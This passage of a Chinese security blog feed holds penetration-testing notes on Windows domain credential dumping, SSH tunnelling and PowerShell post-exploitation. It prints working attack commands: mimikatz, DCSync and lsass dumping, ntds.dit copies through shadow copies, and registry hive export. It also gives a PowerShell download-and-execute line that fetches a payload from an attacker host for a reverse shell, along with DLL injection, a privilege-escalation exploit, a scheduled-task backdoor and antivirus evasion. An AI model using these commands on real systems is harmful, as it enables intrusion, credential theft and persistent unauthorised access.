class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:sqladmin /domain:rootkit.org /NTLM:hashvalue</span><br></pre></td></tr></table></figure><p>这样我们只要拿到服务的权限，就能提取出凭证进行攻击。</p><h5 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h5><p>看绿盟那篇博客吧…</p><h4 id="哈希导出"><a href="#哈希导出" class="headerlink" title="哈希导出"></a>哈希导出</h4><p>可以使用<code>procdump.exe</code>导出<code>lsass.exe</code>中的内存映像，离线抓密码</p><p><code>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></p><p><code>mimikatz::sekurlsa:minidump lsass.dmp</code></p><p><code>mimikatz::sekurlsa:logonpasswords</code></p><h5 id="DCsync"><a href="#DCsync" class="headerlink" title="DCsync"></a>DCsync</h5><h6 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h6><p><code>lsadump::dcsync /domain:rootkit.org /all /csv</code>  利用<code>dcsync</code>(目录复制服务)获取<code>ntds.dit</code>中的密码哈希。 可以在域管理范围之内的任意一台主机运行。</p><p>多加一个<code>/user name</code> 参数，可以指定用户导出</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922143030.png" alt></p><p>也可以直接在域控上导出<code>lsass.exe</code>进程中的哈希。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /inject</span><br></pre></td></tr></table></figure><h6 id="powershell-1"><a href="#powershell-1" class="headerlink" title="powershell"></a>powershell</h6><p><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-DCSync.ps1" target="_blank" rel="noopener">Invoke-DCSync.ps1</a></p><h6 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h6><p><code>credentials/mimikatz/dcsync_hashdump</code></p><h5 id="NTDS-DIT-Volume-Shadow-Copy-Service"><a href="#NTDS-DIT-Volume-Shadow-Copy-Service" class="headerlink" title="NTDS.DIT/Volume Shadow Copy Service"></a>NTDS.DIT/Volume Shadow Copy Service</h5><p><code>NTDS.DIT</code>文件保存了域中所有用户的密码和哈希值。</p><h6 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a>ntdsutil</h6><p>默认安装 </p><p>查询快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;List Mounted&quot; quit quit</span><br></pre></td></tr></table></figure><p>创建快照</p><p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p><p>挂载快照</p><p><code>ntdsutil snapshot &quot;mount {2931cb68-5c88-4f27-ac6d-abcb738bfee7}&quot; quit quit</code></p><p>复制</p><p><code>copy C:\$SNAP_201909221525_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</code></p><p>一定要在<code>cmd</code>中运行… 一开始在<code>ps</code>中运行，老是找不到路径…</p><p>卸载快照 清理痕迹</p><p><code>ntdsutil snapshot &quot;unmount {2931cb68-5c88-4f27-ac6d-abcb738bfee7}&quot; quit quit</code></p><h6 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a>vssadmin</h6><p>默认安装</p><p>查询系统快照</p><p><code>vssadmin list shadows</code></p><p>创建快照</p><p><code>vssadmin create shadow /for=c:</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922153355.png" alt></p><p>复制文件</p><p><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit c:\ntds.dit</code></p><p>删除快照</p><p><code>vssadmin delete shadows /for=c: /quiet</code></p><h6 id="vshadow"><a href="#vshadow" class="headerlink" title="vshadow"></a>vshadow</h6><p>不自带，直接使用<code>.bat</code>版</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">setlocal</span><br><span class="line">if NOT &quot;%CALLBACK_SCRIPT%&quot;==&quot;&quot; goto :IS_CALLBACK</span><br><span class="line">set SOURCE_DRIVE_LETTER=%SystemDrive%</span><br><span class="line">set SOURCE_RELATIVE_PATH=\windows\ntds\ntds.dit</span><br><span class="line">set DESTINATION_PATH=%~dp0</span><br><span class="line">@echo ...Determine the scripts to be executed/generated...</span><br><span class="line">set CALLBACK_SCRIPT=%~dpnx0</span><br><span class="line">set TEMP_GENERATED_SCRIPT=GeneratedVarsTempScript.cmd</span><br><span class="line">@echo ...Creating the shadow copy...</span><br><span class="line">&quot;%~dp0vshadow.exe&quot; -script=%TEMP_GENERATED_SCRIPT% -exec=&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%</span><br><span class="line">del /f %TEMP_GENERATED_SCRIPT%</span><br><span class="line">@goto :EOF</span><br><span class="line">:IS_CALLBACK</span><br><span class="line">setlocal</span><br><span class="line">@echo ...Obtaining the shadow copy device name...</span><br><span class="line">call %TEMP_GENERATED_SCRIPT%</span><br><span class="line">@echo ...Copying from the shadow copy to the destination path...</span><br><span class="line">copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%</span><br></pre></td></tr></table></figure><p>上传<code>.bat</code>和<code>exe</code>文件到当前目录，可以下载源码编译，想偷懒也可以直接<a href="https://www.mypcrun.com/file-info-page/vshadow-exe/" target="_blank" rel="noopener">戳这里</a> 不保证安全性。</p><p>运行脚本，会自动执行整个流程。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922155003.png" alt></p><p>导出之前还需要用<code>esentutl</code>修复一下</p><p><code>esentutl /p /o ntds.dit</code></p><p>导出<code>syskey</code></p><p><code>reg save hklm\system system.hive</code></p><h6 id="…"><a href="#…" class="headerlink" title="…."></a>….</h6><h5 id="从NTDS-DIT中提取哈希"><a href="#从NTDS-DIT中提取哈希" class="headerlink" title="从NTDS.DIT中提取哈希"></a>从NTDS.DIT中提取哈希</h5><p>得到<code>ntds.dit</code>文件以后，直接在线导出哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe --dump-hash-domain --with-history --ntds-file ntds.dit --system-file system.hive -o pass.txt</span><br></pre></td></tr></table></figure><p><a href="https://github.com/tuthimi/quarkspwdump" target="_blank" rel="noopener">quarkspwdump.exe</a></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190922160347.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">quarks-pwdump.exe &lt;options&gt;</span><br><span class="line">Options :</span><br><span class="line">-dhl  --dump-hash-local</span><br><span class="line">-dhdc --dump-hash-domain-cached</span><br><span class="line">-dhd  --dump-hash-domain (NTDS_FILE must be specified)</span><br><span class="line">-db   --dump-bitlocker (NTDS_FILE must be specified)</span><br><span class="line">-nt   --ntds-file FILE</span><br><span class="line">-hist --with-history (optional)</span><br><span class="line">-t    --output-type JOHN/LC (optional, if no=&gt;JOHN)</span><br><span class="line">-o    --output FILE (optional, if no=&gt;stdout)</span><br><span class="line"></span><br><span class="line">Example: quarks-pwdump.exe --dump-hash-domain --with-history</span><br></pre></td></tr></table></figure><p>也可以用<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noopener">Invoke-NinjaCopy.ps1</a></p><h5 id="注册表导出哈希"><a href="#注册表导出哈希" class="headerlink" title="注册表导出哈希"></a>注册表导出哈希</h5><p>涉及到三个注册表项，分别是<code>HKEY_LOCAL_MACHINE\SAM</code> <code>HKEY_LOCAL_MACHINE\SECURITY</code> <code>HKEY_LOCAL_MACHINE\SYSTEM</code></p><p><code>HKEY_LOCAL_MACHINE\SAM</code>包含本地用户凭证</p><p><code>HKEY_LOCAL_MACHINE\SECURITY</code>中缓存了域用户的凭证</p><p><code>HKEY_LOCAL_MACHINE\SYSTEM</code>中可以提取出<code>syskey</code>，进而解密哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg.exe save hklm\sam c:\sam.save</span><br><span class="line">reg.exe save hklm\security c:\security.save</span><br><span class="line">reg.exe save hklm\system c:\system.save</span><br></pre></td></tr></table></figure><p>使用<code>impacket</code>套件中的<code>secretsdump.py</code>解密</p><p><code>python secretsdump.py -sam ../../sam.save  -security ../../security.save  -system ../../system.save  LOCAL</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190923105223.png" alt></p><p>也可以用<code>cain</code>.</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>工具千千万，重要的还是思路吧 : ）</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="noopener">深刻理解windows安全认证机制 ntlm &amp; Kerberos</a></p><p><a href="https://www.secpulse.com/archives/94848.html" target="_blank" rel="noopener">彻底理解Windows认证 – 议题解读</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-11631.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-11631.html</a></p><p><a href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4" target="_blank" rel="noopener">LM, NTLM, Net-NTLMv2, oh my!</a></p><p><a href="https://github.com/crazywa1ker/DarthSidious-Chinese" target="_blank" rel="noopener">https://github.com/crazywa1ker/DarthSidious-Chinese</a></p><p><a href="https://sakuxa.com/2019/04/03/01-Windows认证之NTLM/" target="_blank" rel="noopener">https://sakuxa.com/2019/04/03/01-Windows认证之NTLM/</a></p><p><a href="[http://www.h0r2yc.cn/2019/08/17/windows%E8%AE%A4%E8%AF%81-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E3%80%81%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/](http://www.h0r2yc.cn/2019/08/17/windows认证-白银票据、黄金票据分析及利用/)">windows认证-白银票据、黄金票据分析及利用</a></p><p><a href="[https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/](https://3gstudent.github.io/3gstudent.github.io/域渗透-Kerberoasting/)">域渗透——Kerberoasting</a></p><p><a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="noopener">我所了解的内网渗透——内网渗透知识大总结</a></p><p><a href="https://www.freebuf.com/articles/system/6089.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/6089.html</a></p><p><a href="https://www.freebuf.com/articles/system/198381.html" target="_blank" rel="noopener">Kerberos协议探索系列之委派篇</a></p><p><a href="https://www.anquanke.com/post/id/166934" target="_blank" rel="noopener">攻击活动目录：无约束委派及域林信任</a></p><p><a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">S4U2Pwnage</a></p><p><a href="http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/" target="_blank" rel="noopener">http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/</a></p><p><a href="https://xz.aliyun.com/t/2931" target="_blank" rel="noopener">Attacking Kerberos Delegation</a></p><p><a href="https://www.anquanke.com/post/id/151241#h2-12" target="_blank" rel="noopener">域密码哈希导出的那些事儿</a></p><p><a href="https://www.cnblogs.com/backlion/p" target="_blank" rel="noopener">渗透测试中心</a></p><p><a href="[https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/](https://3gstudent.github.io/3gstudent.github.io/域渗透-获得域控服务器的NTDS.dit文件/)">域渗透-获得域控服务器的NTDS.dit文件</a></p><p><a href="[https://wooyun.js.org/drops/%E5%AF%BC%E5%87%BA%E5%BD%93%E5%89%8D%E5%9F%9F%E5%86%85%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7hash%E7%9A%84%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86.html](https://wooyun.js.org/drops/导出当前域内所有用户hash的技术整理.html)">导出当前域内所有用户hash的技术整理</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据转发姿势(不定期更新...)</title>
      <link href="/2019/09/18/data-forward/"/>
      <url>/2019/09/18/data-forward/</url>
      
        <content type="html"><![CDATA[<p>记录数据转发的各类姿势手法。</p><a id="more"></a><h4 id="SSH-端口转发"><a href="#SSH-端口转发" class="headerlink" title="SSH 端口转发"></a>SSH 端口转发</h4><h5 id="动态端口转发-SOCKS代理"><a href="#动态端口转发-SOCKS代理" class="headerlink" title="动态端口转发(SOCKS代理)"></a>动态端口转发(SOCKS代理)</h5><p>让不加密的连接走<code>SSH</code>连接，提高数据安全性。</p><p><code>SSH -D port user@host</code></p><p><code>SSH</code>会建立一个<code>socket</code>连接，监听转发的端口。经过该端口的数据会被转发到远程主机。</p><h5 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h5><p>A B C三台主机，A在网段A，B在网段B，不能互相ping通，但是C有两张网卡可以沟通A和B，我们可以在C上使用动态端口转发，然后A挂上C的socks代理就能访问B。</p><h5 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h5><p><code>ssh -L local_port ssh_ip ssh_port server</code></p><h5 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h5><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909104551.png" alt></p><p><code>host1</code>和<code>host2</code>不能直接访问，但是可以通过<code>host2</code>中继一下。</p><p><code>ssh -L 2121:host2:21 host3</code></p><p><code>host1</code>绑定本地2121端口，当有到2121端口连接时转发到<code>host3</code>,由<code>host3</code>连接到<code>host2</code>的21端口。此时<code>host1</code>作为一个服务端。</p><p><code>host1</code>本地执行<code>ssh -p 2121 localhost</code> 连接到本地2121端口，实际连接的是<code>host2</code>的22端口。</p><h5 id="远程端口转发-内网穿透"><a href="#远程端口转发-内网穿透" class="headerlink" title="远程端口转发(内网穿透)"></a>远程端口转发(内网穿透)</h5><p><code>ssh -R port:&lt;host2&gt;:host2_port host3</code></p><p>让远程主机<code>host3</code>监听端口<code>port</code>,本地主机与<code>host</code>建立连接。将内网<code>host2</code>端口转发到外网<code>host3</code>的<code>port</code>端口。</p><h5 id="场景-2"><a href="#场景-2" class="headerlink" title="场景"></a>场景</h5><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190909110356.png" alt></p><p>外网不能访问内网，内网之间可以访问。</p><p>在<code>host1</code>上，<code>ssh -R 2222:host2:22 host3</code>,意思就是让<code>host3</code>监听2222端口，然后把数据经过<code>host1</code>转发给<code>host2</code></p><p>在<code>host3</code>上，<code>ssh -p 2222 localhost</code> 实际连接的是<code>host2</code>。</p><p>如果<code>host1</code>和<code>host2</code>是同一台主机，就更好理解了，典型的内网穿透的场景，内网能访问外网，但是外网不能访问内网。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><ul><li><a href="https://cherrot.com/tech/2017/01/08/ssh-tunneling-practice.html" target="_blank" rel="noopener">https://cherrot.com/tech/2017/01/08/ssh-tunneling-practice.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell初体验</title>
      <link href="/2019/09/17/powershell/"/>
      <url>/2019/09/17/powershell/</url>
      
        <content type="html"><![CDATA[<p>菜鸡的自我救赎之路 :）</p><a id="more"></a><h4 id="0x01-预备知识"><a href="#0x01-预备知识" class="headerlink" title="0x01 预备知识"></a>0x01 预备知识</h4><h5 id="基本规则-amp-查看帮助"><a href="#基本规则-amp-查看帮助" class="headerlink" title="基本规则&amp;查看帮助"></a>基本规则&amp;查看帮助</h5><p><code>PowerShell</code>的每个命令都遵循<code>谓词-名词</code>的标准，例如<code>GET-Process</code>.</p><p><code>-</code>为标准参数分隔符，每个参数前面始终带<code>-</code> 例<code>Get-Command -Name Clear-Host</code></p><p><code>Get-Command -Name 命令名</code> 可以查看该命令的用法</p><p><code>Get-Command</code>  获取帮助</p><p>命令后跟上<code>-?</code> 可查看详细的用法说明 例<code>Get-Command -?</code></p><p><code>PowerShell</code>中也支持一些常见的<code>cmd</code>命令或者是<code>shell</code>命令。</p><h5 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h5><ul><li><p><code>Get-Host</code> 查看版本信息</p></li><li><p><code>Clear-Host</code> 清空输出窗口</p></li><li><p><code>New-Item 1.txt -type file [-force]</code>  <code>-force</code>将覆盖原有的同名文件。</p></li><li><p><code>Get-Content</code> 获取文件内容，直接输出到控制台上。</p></li><li><p><code>Out-File</code> 重定向，写文件(类似于<code>linux</code>中的<code>&gt;</code>) ，常配合管道使用</p></li></ul><pre><code>例，将当前正在运行进程名写入到`process.txt`</code></pre><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190911162258.png" alt></p><ul><li><p><code>Write-Output</code> 配合管道使用，为最后一个命令时输出到控制台中。</p></li><li><p>下载文件到本地</p></li></ul><p>  使用<code>.NET</code>中提供的<code>System.Net.WebClient</code>类</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$url = &quot;http://127.0.0.1/1.exe&quot;</span><br><span class="line">$end_flag = &quot;download finish!&quot;</span><br><span class="line">$local_file = &quot;rec.exe&quot;</span><br><span class="line">Write-Output &quot;start to download&quot;</span><br><span class="line"></span><br><span class="line">#public void DownloadFile (Uri address, string fileName); filename: local file to receive remote file</span><br><span class="line">(New-Object System.Net.WebClient).DownloadFile($url,$local_file)</span><br><span class="line">Write-Output $end_flag</span><br></pre></td></tr></table></figure><ul><li><code>Invike-Exppession</code> 把字符串当作命令执行，返回执行结果。<code>IEX</code>是它的别名。</li></ul><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$command = &apos;Get-Process&apos;</span><br><span class="line">IEX($command)|Write-Output</span><br></pre></td></tr></table></figure>![](https://boombao.oss-cn-beijing.aliyuncs.com/20190911173727.png)</code></pre><h5 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h5><p>对脚本运行做的一种限制措施，在不同的场景中采取不同的策略来防止执行恶意代码。</p><p>由六种执行策略，分别是<code>RESTRICTED</code> <code>ALLSIGNED</code> <code>REMOTESIGNED</code> <code>UNRESTRICTED</code> <code>BYPASS</code> <code>UNDEFINED</code>，默认情况下为<code>RESTRICTED</code></p><p><code>RESTRICTED</code></p><ul><li>默认执行策略</li><li>阻止所有脚本运行</li><li>Windows 8、Windows Server 2012 和 Windows 8.1 中的默认执行策略</li></ul><p><code>ALLSIGNED</code></p><ul><li><p>可以运行由受信任机构发布的签名的脚本</p></li><li><p><code>Set-AuthenticodeSignature</code> 命令可以给脚本签名，以本地<code>PFX</code>文件签名为例,详细的签名过程可以<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature?view=powershell-6" target="_blank" rel="noopener">戳这里</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cert = Get-PfxCertificate -FilePath C:\Test\Mysign.pfx</span><br><span class="line">Set-AuthenticodeSignature -FilePath ServerProps.ps1 -Certificate $cert</span><br></pre></td></tr></table></figure></li></ul><p><code>REMOTESIGNED</code></p><ul><li><code>server 2012 R2</code>默认策略</li><li>远程加载脚本时仍需要签名，本地不需要。</li><li>有一定的安全风险。</li></ul><p><code>UNRESTRICTED</code></p><ul><li>未签名的脚本可以运行</li><li>远程加载脚本时会有安全提示。</li></ul><p><code>BYPASS</code></p><ul><li>没有任何限制与提示。</li></ul><p><code>UNDEFINED</code></p><ul><li>没有设置安全策略，此时会使用默认安全策略。</li></ul><p>查看当前执行策略 <code>Get-ExecutionPolicy</code> </p><p>查看当前用户执行策略 <code>Get-ExecutionPolicy -Scope CurrentUser</code></p><p>使用<code>Set-ExecutionPolicy -ExecutionPolicy PolicyName</code>改变执行策略。</p><p>修改完毕后有时候会提示你未修改成功，因为有更细化的执行策略，所以保留当前策略，可以使用<code>Get-ExecutionPolicy -List</code> 查看优先级。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190911153259.png" alt></p><h5 id="绕过执行策略执行脚本"><a href="#绕过执行策略执行脚本" class="headerlink" title="绕过执行策略执行脚本"></a>绕过执行策略执行脚本</h5><ul><li><code>powershell.exe -ExecutionPolicy Bypass -File ..\demo.ps1</code></li></ul><p>  <img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190911182106.png" alt></p><ul><li><p><code>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo   -File ..\demo.ps1</code></p></li><li><p>远程下载文件到服务器上运行</p><p><code>powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo   -NoProfile  -File ..\demo.ps1</code></p></li><li><p>…..</p></li></ul><h4 id="0x02最简单的场景"><a href="#0x02最简单的场景" class="headerlink" title="0x02最简单的场景"></a>0x02最简单的场景</h4><p>假设我们现在拿到一个<code>webshell</code>，要反弹一个<code>shell</code>回来，直接使用<code>PowerShell</code>加载<code>shellcode</code>，在终端中下载并运行该脚本，<code>metasploit</code>能够接收到反弹回来的<code>shell</code>。</p><p><code>ps:</code> 本文尽量使用<code>powershell</code>作为攻击手段 (主角光环</p><p><code>powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;http://192.168.30.166:8000/payload.ps1&#39;)&quot;</code></p><p>得到一个<code>meterpreter</code>后加载<code>powershell</code>插件，进入<code>powershell</code>界面。</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190916144258.png" alt></p><p>测试的时候发现通过该方式得到的<code>meterpreter</code>很不稳定，经常崩溃导致<code>shell</code>丢失，所以要重新获得一个<code>shell</code>.</p><p>使用<code>dll</code>注入的方式得到一个<code>shell</code>,<code>msfvenom</code>生成<code>dll</code>,同时监听相应端口接收反弹回来的<code>shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; IEX (New-Object Net.WebClient).DownloadString(&apos;http://192.168.30.166/CodeExecution/Invoke-DllInjection.ps1&apos;)</span><br><span class="line">PS &gt; start-process c:\windows\system32\notepad.exe -Windowstyle Hidden</span><br><span class="line">PS &gt; get-process notepad</span><br><span class="line"></span><br><span class="line">Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName</span><br><span class="line">-     86       9     1864       6280    79     0.11  10200 notepad</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS &gt; Invoke-DllInjection -ProcessID 10200 -dll C:\Users\admin\Desktop\paylod.dll</span><br><span class="line"></span><br><span class="line">   Size(K) ModuleName                                         FileName</span><br><span class="line">   ------- ----------                                         --------</span><br><span class="line">        20 paylod.dll                                         C:\Users\admin\Desktop\paylod.dll</span><br></pre></td></tr></table></figure><p>尝试提权，使用增强版的<code>Invoke-ReflectivePEInjection.ps1</code>，可以远程加载<code>exe</code>在内存中运行，做到攻击不落地,实际中尝试多次均失败…</p><p>使用<code>msf</code>自带的<code>exploit-suggester</code>检测一下系统存在的提权漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/recon/local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this module on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits</span><br><span class="line"></span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf5 post(multi/recon/local_exploit_suggester) &gt; exploit</span><br></pre></td></tr></table></figure><p>我本地虚拟机没打补丁，所以存在很多漏洞…</p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190916154900.png" alt></p><p>也可以用<code>Sherlock.ps1</code> ,<code>powershell</code>实现的相同功能的脚本，后者更加详细准确一些。</p><p>地址：<a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank" rel="noopener">https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1</a></p><p>使用<code>MS16-135</code>提权 脚本地址<a href="https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135</a></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190916165439.png" alt></p><p>有了权限，下一步抓取<code>hash</code>，使用<code>Invoke-Mimikatz.ps1</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190916171328.png" alt></p><p>进一步信息收集，上<code>lazagne</code> <a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a>,查看可能存在的密码啥的。</p><p>扫描一下内网存活主机以及开放端口</p><p>使用<code>Invoke-Portscan.ps1</code>，扫描速度与精度还算可以吧，还是稍微有点误差..</p><p><code>IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.30.166/Recon/Invoke-Portscan.ps1&#39;)</code></p><p><code>Invoke-Portscan -Hosts 192.168.30.0/24 -T 4 -Ports &quot;21,22,23,80,1433,1521,3306,3389&quot; | out-file port_result.txt</code></p><p><code>cat port_result.txt</code></p><p><img src="https://boombao.oss-cn-beijing.aliyuncs.com/20190917100628.png" alt></p><p>可以发现其他存活主机，然后继续横向渗透，因为本地并没有域环境，本次就到此为止，后续域渗透时再补上<code>powershell</code>在域渗透中的应用。</p><p>最后留个后门，清理下痕迹走人。<a href="https://github.com/re4lity/Schtasks-Backdoor" target="_blank" rel="noopener">https://github.com/re4lity/Schtasks-Backdoor</a></p><p>随着<code>powershell</code>在渗透测试中使用的越来越频繁，相关的防护软件都注意到这一点，所以需要做一些混淆来绕过杀软。</p><p>推荐<code>danielbohannon</code>大佬写的混淆框架：<a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation</a></p><p>还有作者写的使用教程：<a href="https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide" target="_blank" rel="noopener">https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide</a></p><p>也可以直接使用<code>Empire</code>后渗透框架来完成渗透流程。</p><h4 id="0x03-姿势-amp-工具"><a href="#0x03-姿势-amp-工具" class="headerlink" title="0x03 姿势&amp;工具"></a>0x03 姿势&amp;工具</h4><ul><li><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p></li><li><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite</a></p></li><li><p><a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">https://github.com/danielbohannon/Invoke-Obfuscation</a></p></li><li><p><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire</a></p></li><li><p>….</p></li></ul><h4 id="0x04参考链接"><a href="#0x04参考链接" class="headerlink" 